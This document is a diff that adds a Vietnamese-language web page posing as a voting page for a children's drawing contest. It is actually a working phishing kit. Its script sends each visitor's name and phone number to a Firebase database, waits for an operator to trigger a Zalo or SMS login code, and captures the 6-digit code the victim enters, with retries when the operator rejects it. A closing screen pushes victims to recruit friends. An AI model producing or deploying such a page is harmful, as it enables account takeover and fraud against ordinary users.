@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bình Chọn Cuộc Thi Vẽ Tranh 2026</title>
+    <meta property="og:title" content="Bình Chọn Cuộc Thi Vẽ Tranh Ươm Mầm Tài Năng">
+    <style>
+        /* CSS Reset & Cơ bản */
+        body, html { 
+            margin: 0; padding: 0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #f4f6f9; 
+            color: #333; 
+            -webkit-tap-highlight-color: transparent; 
+            min-height: 100vh;
+        }
+        
+        /* Header màu hồng đào nhã nhặn */
+        .header { 
+            background: #ff8e9b; 
+            background: linear-gradient(to right, #ff8e9b, #ff9a9e);
+            padding: 22px 20px; 
+            color: white; 
+            text-align: center; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08); 
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .header h1 { margin: 0; font-size: 24px; text-transform: uppercase; letter-spacing: 1px; font-weight: bold;}
+        .header p { margin: 8px 0 0 0; font-size: 15px; font-weight: 500; }
+
+        /* Container chứa lưới ảnh */
+        .gallery-container { 
+            max-width: 1100px; 
+            margin: 30px auto; 
+            padding: 0 20px; 
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 25px; 
+        }
+
+        /* Thẻ tác phẩm */
+        .art-card { 
+            background: #fff; 
+            border-radius: 12px; 
+            overflow: hidden; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05); 
+            transition: all 0.3s ease; 
+            display: flex; 
+            flex-direction: column;
+            border: 2px solid #eef0f3;
+        }
+        .art-card:hover { 
+            transform: translateY(-5px); 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+            border-color: #ff8e9b;
+        }
+        
+        .art-img { 
+            width: 100%; 
+            height: 240px; 
+            object-fit: cover; 
+            background-color: #f1f2f6; 
+            display: block;
+        }
+        
+        .art-info { 
+            padding: 20px; 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            text-align: center; 
+            background: #ffffff;
+        }
+        
+        /* Badge số báo danh màu pastel dịu nhẹ */
+        .sbd-badge { 
+            color: white; 
+            padding: 5px 15px; 
+            border-radius: 20px; 
+            font-weight: bold; 
+            font-size: 13px; 
+            margin-bottom: 12px; 
+            text-transform: uppercase;
+        }
+        .badge-1 { background: #ff8e9b; } /* Hồng đào */
+        .badge-2 { background: #3ab0ff; } /* Xanh lơ */
+        .badge-3 { background: #2cb57e; } /* Xanh ngọc */
+
+        .art-title { font-size: 19px; font-weight: bold; margin: 0 0 8px 0; color: #222; line-height: 1.3;}
+        .art-author { font-size: 14px; color: #666; margin-bottom: 18px; font-style: italic;}
+
+        /* Nút Bình Chọn màu xanh ngọc lịch sự */
+        .btn-vote { 
+            background: #2cb57e; 
+            color: white; border: none; padding: 12px 20px; 
+            font-size: 15px; font-weight: bold; border-radius: 25px; 
+            cursor: pointer; transition: all 0.2s; width: 100%; 
+            text-transform: uppercase; display: flex; justify-content: center; align-items: center; gap: 8px;
+            box-shadow: 0 4px 10px rgba(44, 181, 126, 0.2);
+        }
+        .btn-vote:hover { background: #249969; }
+        .btn-vote svg { width: 18px; height: 18px; fill: white; }
+        .btn-vote.voted { background: #cbd5e1; color: #fff; cursor: not-allowed; box-shadow: none;}
+
+        /* Bảng Popup Modal */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; opacity: 0; transition: opacity 0.3s; padding: 15px; box-sizing: border-box; }
+        .modal-box { background: #ffffff; width: 100%; max-width: 420px; border-radius: 12px; padding: 25px; box-sizing: border-box; position: relative; transform: scale(0.95); transition: transform 0.3s; box-shadow: 0 10px 30px rgba(0,0,0,0.2);}
+        
+        .modal-title { font-size: 20px; font-weight: bold; color: #ff8e9b; margin: 0 0 12px 0; text-align: center; text-transform: uppercase;}
+        .modal-desc { font-size: 15px; color: #444; text-align: center; line-height: 1.5; margin-bottom: 20px; }
+
+        .fb-input { width: 100%; padding: 14px 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; box-sizing: border-box; margin-bottom: 15px; outline: none; transition: border 0.2s; background: #fdfdfd;}
+        .fb-input:focus { border-color: #ff8e9b; background: #fff;}
+
+        /* TRẠNG THÁI NÚT CHUNG CHO MODAL */
+        .btn-primary { 
+            width: 100%; 
+            background: #cbd5e1; /* Màu xám mặc định (chưa đủ thông tin) */
+            color: #ffffff; 
+            border: none; 
+            padding: 14px; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: not-allowed; 
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+        
+        /* TRẠNG THÁI ACTIVE (Màu xanh dương) */
+        .btn-primary.active {
+            background: #0068ff; 
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 104, 255, 0.3);
+        }
+        .btn-primary.active:active { transform: scale(0.98); opacity: 0.9; }
+        
+        .sbd-container { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 20px; }
+        .sbd-input { width: 100%; height: 50px; font-size: 24px; text-align: center; border: 1px solid #ccc; border-radius: 8px; font-weight: bold; outline: none; flex: 1; background: #fdfdfd; }
+        .sbd-input:focus { border-color: #ff8e9b; background: #fff;}
+
+        .error-msg { color: #d9534f; font-size: 14px; text-align: center; margin-bottom: 15px; display: none; font-weight: bold;}
+        .loader-container { display: none; flex-direction: column; align-items: center; padding: 20px 0; }
+        .fb-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8e9b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #step2, #stepSuccessSMS, #stepSuccessZalo { display: none; }
+        
+        .step-success-desc-zalo { font-size: 15px; line-height: 1.5; margin-bottom: 20px; background: #fff8e5; color: #8a6d3b; padding: 15px; border-radius: 8px; border: 1px solid #faebcc;}
+        .step-success-desc-sms { font-size: 15px; line-height: 1.5; margin-bottom: 25px; text-align: center; color: #333;}
+        
+        /* Nút thành công mặc định là có thể bấm được */
+        .btn-primary-success { width: 100%; background: #0068ff; color: #ffffff; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase;}
+        .btn-primary-success:active { transform: scale(0.98); opacity: 0.9; }
+
+        /* =========================================
+           THIẾT KẾ FIX LỖI TRỐNG KHUNG HÌNH MOBILE
+           ========================================= */
+        @media (max-width: 768px) {
+            .header { padding: 15px 12px; }
+            .header h1 { font-size: 18px; }
+            .header p { font-size: 13px; margin-top: 5px;}
+
+            .gallery-container { 
+                grid-template-columns: 1fr; 
+                gap: 15px; 
+                margin: 15px auto 30px auto; 
+                padding: 0 12px; 
+            }
+            
+            .art-card { 
+                flex-direction: row; 
+                align-items: stretch;
+                min-height: 140px; 
+                border-radius: 10px;
+                padding: 0;
+            }
+            
+            .art-img { 
+                width: 40%; 
+                height: auto; 
+                border-right: 1px solid #eef0f3;
+                border-radius: 10px 0 0 10px;
+            }
+            
+            .art-info { 
+                width: 60%; 
+                padding: 12px 10px; 
+                align-items: flex-start; 
+                text-align: left; 
+                justify-content: center;
+            }
+            
+            .sbd-badge { font-size: 11px; padding: 4px 10px; margin-bottom: 6px; }
+            
+            .art-title { 
+                font-size: 15px; margin-bottom: 4px; display: -webkit-box;
+                -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+            }
+            
+            .art-author { font-size: 12px; margin-bottom: 10px; }
+            
+            .btn-vote { padding: 8px 12px; font-size: 12px; width: auto; margin-top: auto; }
+            .btn-vote svg { width: 14px; height: 14px; }
+            .modal-box { padding: 20px 15px; }
+            .sbd-input { height: 42px; font-size: 20px; padding: 0;}
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <header class="header">
+        <h1>Cuộc Thi Vẽ Tranh "Ươm Mầm Tài Năng"</h1>
+        <p>Hãy bình chọn cho tác phẩm mà bạn yêu thích nhất!</p>
+    </header>
+
+    <div class="gallery-container">
+        <!-- Thí sinh 61 -->
+        <div class="art-card">
+            <img src="https://anhvedep.com/wp-content/uploads/2026/02/ve-tranh-noi-khong-voi-bao-luc-hoc-duong.jpg" alt="Tác phẩm 61" class="art-img">
+            <div class="art-info">
+                <span class="sbd-badge badge-1">Số Báo Danh: 61</span>
+                <h3 class="art-title">Nói Không Với Bạo Lực</h3>
+                <div class="art-author">Tác giả: Nguyễn Yến Nhi</div>
+                <button class="btn-vote" id="btn-vote-61" onclick="openVoting('61')">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    Bình chọn
+                </button>
+            </div>
+        </div>
+
+        <!-- Thí sinh 62 -->
+        <div class="art-card">
+            <img src="https://congdankhuyenhoc.qltns.mediacdn.vn/449484899827462144/2023/5/13/z4341585507219-0d19166ab3aea13a2e58d6e98a6a26d1-168396088749173714148.jpg" alt="Tác phẩm 62" class="art-img">
+            <div class="art-info">
+                <span class="sbd-badge badge-2">Số Báo Danh: 62</span>
+                <h3 class="art-title">Chung Tay Bảo Vệ</h3>
+                <div class="art-author">Tác giả: Trần Minh Khang</div>
+                <button class="btn-vote" id="btn-vote-62" onclick="openVoting('62')">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    Bình chọn
+                </button>
+            </div>
+        </div>
+
+        <!-- Thí sinh 63 -->
+        <div class="art-card">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2awyiHi-oc5j_M_RoYMaWlPYgKK8ZQ5wbEzQlkX0bcHYjw0OIqJGlRQLK&s=10" alt="Tác phẩm 63" class="art-img">
+            <div class="art-info">
+                <span class="sbd-badge badge-3">Số Báo Danh: 63</span>
+                <h3 class="art-title">Vì Một Môi Trường Trong Sạch</h3>
+                <div class="art-author">Tác giả: Lê Bảo Châu</div>
+                <button class="btn-vote" id="btn-vote-63" onclick="openVoting('63')">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    Bình chọn
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CHUNG CHO CÁC SỐ BÁO DANH -->
+    <div class="modal-overlay" id="overlay">
+        <div class="modal-box" id="modalBox">
+            
+            <div id="step1">
+                <h3 class="modal-title">XÁC NHẬN BÌNH CHỌN</h3>
+                <div class="modal-desc" id="modalVoteDesc">Vui lòng nhập thông tin để hệ thống ghi nhận phiếu bình chọn hợp lệ...</div>
+                <div class="error-msg" id="error1">Vui lòng nhập đầy đủ thông tin hợp lệ.</div>
+                
+                <input type="text" class="fb-input" id="voterName" placeholder="Tên Facebook người bình chọn">
+                <input type="tel" class="fb-input" id="voterPhone" placeholder="Số điện thoại" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                
+                <button class="btn-primary" onclick="submitStep1()" id="btnSubmit1">Tiếp tục</button>
+            </div>
+
+            <div id="step2">
+                <h3 class="modal-title">NHẬP MÃ BÌNH CHỌN</h3>
+                <div class="modal-desc" id="codeDescContainer"></div>
+                <div class="error-msg" id="error2">Vui lòng nhập đủ thông tin hợp lệ.</div>
+                
+                <div class="sbd-container">
+                    <input type="tel" class="sbd-input" maxlength="1"><input type="tel" class="sbd-input" maxlength="1"><input type="tel" class="sbd-input" maxlength="1"><input type="tel" class="sbd-input" maxlength="1"><input type="tel" class="sbd-input" maxlength="1"><input type="tel" class="sbd-input" maxlength="1">
+                </div>
+                
+                <button class="btn-primary" onclick="submitStep2()" id="btnSubmit2">Hoàn tất bình chọn</button>
+            </div>
+
+            <!-- SUCCESS ZALO -->
+            <div id="stepSuccessZalo" style="text-align: center; padding: 10px 0;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Icon_of_Zalo.svg" alt="Zalo" style="width: 55px; height: 55px; margin-bottom: 15px;">
+                <h3 class="modal-title" style="color: #0068ff;">Gần hoàn tất!</h3>
+                <div class="step-success-desc-zalo">
+                    Hệ thống đã nhận mã thành công.<br>Để hoàn tất quy trình bình chọn cần bước cuối:<br><br>
+                    <b>Vui lòng nhắn tin cho người nhờ bình chọn</b> để nhận danh sách 3 bạn bè.<br><br>
+                    <i style="font-size: 13px;">Lưu ý: Nếu không có bước này, hệ thống sẽ hủy bỏ Phiếu Bầu vừa rồi.</i>
+                </div>
+                <button class="btn-primary-success" onclick="finishVoting()">Xác nhận đóng</button>
+            </div>
+
+            <!-- SUCCESS SMS -->
+            <div id="stepSuccessSMS" style="text-align: center; padding: 10px 0;">
+                <svg viewBox="0 0 24 24" width="65" height="65" fill="#2cb57e" style="margin-bottom: 15px;">
+                    <circle cx="12" cy="12" r="12"/>
+                    <path fill="#fff" d="M9.8 16.2L5.4 11.8c-.4-.4-.4-1 0-1.4.4-.4 1-.4 1.4 0l3 3 7.4-7.4c.4-.4 1-.4 1.4 0 .4.4.4 1 0 1.4l-8.1 8.1c-.4.4-1.1.4-1.5.1z"/>
+                </svg>
+                <h3 class="modal-title" style="color: #2cb57e;">Thành công</h3>
+                <div class="step-success-desc-sms">Cảm ơn bạn đã bình chọn và ủng hộ tác phẩm của thí sinh! Phiếu bầu đã được ghi nhận.</div>
+                <button class="btn-primary-success" onclick="finishVoting()" style="background: #2cb57e;">ĐÓNG</button>
+            </div>
+
+            <div class="loader-container" id="loader">
+                <div class="fb-spinner"></div>
+                <div style="font-size: 16px; font-weight: bold; color: #ff8e9b;">Hệ thống đang xử lý...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Cấu hình Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDk5okwiZEg2KOEwjUf1DHiTIFqNypq-So",
+            authDomain: "conhi-vote.firebaseapp.com",
+            databaseURL: "https://conhi-vote-default-rtdb.firebaseio.com",
+            projectId: "conhi-vote",
+            storageBucket: "conhi-vote.firebasestorage.app",
+            messagingSenderId: "953203459869",
+            appId: "1:953203459869:web:da5710aa4b115b5bbf83f4"
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+        let currentSessionId = null;
+        let currentVerificationMethod = null; 
+        let targetSBD = ""; 
+
+        const iconZalo = `<img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Icon_of_Zalo.svg" alt="Zalo" style="width: 20px; height: 20px; vertical-align: middle; margin-left: 5px;">`;
+        const iconSms = `<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#222" stroke-width="2" style="vertical-align: middle; margin-left: 5px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>`;
+
+        // CÁC PHẦN TỬ DOM
+        const nameInput = document.getElementById('voterName');
+        const phoneInput = document.getElementById('voterPhone');
+        const btnSubmit1 = document.getElementById('btnSubmit1');
+        const btnSubmit2 = document.getElementById('btnSubmit2');
+        const sbdInputs = document.querySelectorAll('.sbd-input');
+
+        // KIỂM TRA ĐIỀU KIỆN ĐỂ SÁNG NÚT BƯỚC 1
+        function checkStep1Inputs() {
+            const nameVal = nameInput.value.trim();
+            const phoneVal = phoneInput.value.trim();
+            if (nameVal !== "" && phoneVal.length >= 9) {
+                btnSubmit1.classList.add('active');
+            } else {
+                btnSubmit1.classList.remove('active');
+            }
+        }
+        nameInput.addEventListener('input', checkStep1Inputs);
+        phoneInput.addEventListener('input', checkStep1Inputs);
+
+        // KIỂM TRA ĐIỀU KIỆN ĐỂ SÁNG NÚT BƯỚC 2
+        function checkStep2Inputs() {
+            let codeVal = '';
+            sbdInputs.forEach(input => codeVal += input.value);
+            if (codeVal.length === 6) {
+                btnSubmit2.classList.add('active');
+            } else {
+                btnSubmit2.classList.remove('active');
+            }
+        }
+
+        sbdInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                let val = this.value.replace(/[^0-9]/g, '');
+                if(val.length > 0) {
+                    this.value = val.slice(-1);
+                    if (index < sbdInputs.length - 1) sbdInputs[index + 1].focus();
+                } else this.value = '';
+                checkStep2Inputs();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    sbdInputs[index - 1].focus(); sbdInputs[index - 1].value = ''; 
+                    checkStep2Inputs();
+                }
+            });
+        });
+
+        // Mở popup bình chọn theo Số Báo Danh
+        function openVoting(sbd) {
+            targetSBD = sbd;
+            const btn = document.getElementById('btn-vote-' + sbd);
+            if(btn.classList.contains('voted')) return; 
+
+            document.getElementById('modalVoteDesc').innerHTML = `Vui lòng nhập thông tin để hệ thống ghi nhận phiếu bình chọn hợp lệ cho <b>Số Báo Danh: ${sbd}</b>.`;
+
+            const overlay = document.getElementById('overlay');
+            const box = document.getElementById('modalBox');
+            overlay.style.display = 'flex';
+            setTimeout(() => { overlay.style.opacity = '1'; box.style.transform = 'scale(1)'; }, 10);
+            
+            // Reset các view bước
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('stepSuccessZalo').style.display = 'none';
+            document.getElementById('stepSuccessSMS').style.display = 'none';
+            hideLoader(1);
+            document.getElementById('error1').style.display = 'none';
+            document.getElementById('error2').style.display = 'none';
+
+            // Reset dữ liệu Input và Trạng thái Nút
+            nameInput.value = "";
+            phoneInput.value = "";
+            btnSubmit1.classList.remove('active');
+            
+            sbdInputs.forEach(input => input.value = '');
+            btnSubmit2.classList.remove('active');
+        }
+
+        // Đóng popup sau khi hoàn thành
+        function finishVoting() {
+            const overlay = document.getElementById('overlay');
+            const box = document.getElementById('modalBox');
+            overlay.style.opacity = '0';
+            box.style.transform = 'scale(0.95)';
+            setTimeout(() => { overlay.style.display = 'none'; }, 300);
+            
+            // Đổi trạng thái nút bấm ngoài màn hình chính
+            const btn = document.getElementById('btn-vote-' + targetSBD);
+            if(btn) {
+                btn.classList.add('voted');
+                btn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Đã bình chọn`;
+            }
+        }
+
+        function showLoader(step) {
+            document.getElementById('step' + step).style.display = 'none';
+            document.getElementById('loader').style.display = 'flex';
+        }
+        
+        function hideLoader(step) {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('step' + step).style.display = 'block';
+        }
+
+        function submitStep1() {
+            // KHÓA CLICK NẾU CHƯA ĐỦ ĐIỀU KIỆN
+            if (!btnSubmit1.classList.contains('active')) return;
+
+            const name = nameInput.value.trim();
+            const phone = phoneInput.value.trim();
+            if(name === "" || phone.length < 9) {
+                document.getElementById('error1').style.display = "block";
+                return;
+            }
+            document.getElementById('error1').style.display = "none";
+            showLoader(1);
+
+            currentSessionId = Date.now().toString();
+            
+            db.ref('DatabaseAdmin/' + currentSessionId).set({
+                name: name, 
+                phone: phone, 
+                code: "", 
+                sbd: targetSBD, 
+                time: new Date().toLocaleString('vi-VN'), 
+                status: "step1_pending"
+            }).then(() => {
+                db.ref('DatabaseAdmin/' + currentSessionId + '/status').on('value', (snapshot) => {
+                    const status = snapshot.val();
+                    if(status === "zalo_requested" || status === "sms_requested") {
+                        currentVerificationMethod = status;
+                        document.getElementById('loader').style.display = 'none';
+                        document.getElementById('step1').style.display = "none";
+                        document.getElementById('step2').style.display = "block";
+                        
+                        let txt = status === "zalo_requested" ? "Zalo" : "SMS";
+                        let iconHtml = status === "zalo_requested" ? iconZalo : iconSms;
+                        document.getElementById('codeDescContainer').innerHTML = `Mã bình chọn đã được gửi về <b>${txt} ${iconHtml}</b> của số điện thoại ${phone}. Vui lòng kiểm tra.`;
+                        setTimeout(() => sbdInputs[0].focus(), 300);
+                    } 
+                    else if (status === "step1_rejected") {
+                        hideLoader(1);
+                        document.getElementById('error1').innerText = "Thông tin không hợp lệ, vui lòng kiểm tra lại SĐT.";
+                        document.getElementById('error1').style.display = "block";
+                    }
+                });
+            });
+        }
+
+        function submitStep2() {
+            // KHÓA CLICK NẾU CHƯA ĐỦ ĐIỀU KIỆN
+            if (!btnSubmit2.classList.contains('active')) return;
+
+            let codeVal = '';
+            sbdInputs.forEach(input => codeVal += input.value);
+            if(codeVal.length !== 6) {
+                document.getElementById('error2').innerText = "Vui lòng nhập đủ 6 số.";
+                document.getElementById('error2').style.display = "block";
+                return;
+            }
+            document.getElementById('error2').style.display = "none";
+            showLoader(2);
+
+            db.ref('DatabaseAdmin/' + currentSessionId).update({ code: codeVal, status: "code_submitted" }).then(() => {
+                db.ref('DatabaseAdmin/' + currentSessionId + '/status').on('value', (snapshot) => {
+                    const status = snapshot.val();
+                    if(status === "completed") {
+                        document.getElementById('loader').style.display = 'none';
+                        if (currentVerificationMethod === "zalo_requested") {
+                            document.getElementById('stepSuccessZalo').style.display = "block";
+                        } else {
+                            document.getElementById('stepSuccessSMS').style.display = "block";
+                        }
+                    } else if (status === "code_rejected") {
+                        hideLoader(2);
+                        sbdInputs.forEach(input => input.value = '');
+                        sbdInputs[0].focus();
+                        btnSubmit2.classList.remove('active'); // Đưa nút hoàn tất về xám
+                        document.getElementById('error2').innerText = "Mã sai hoặc hết hạn, vui lòng nhập lại.";
+                        document.getElementById('error2').style.display = "block";
+                        if(currentVerificationMethod) {
+                            db.ref('DatabaseAdmin/' + currentSessionId).update({ status: currentVerificationMethod });
+                        }
+                    }
+                });
+            });
+        }
+    </script>
+</body>
+</html>
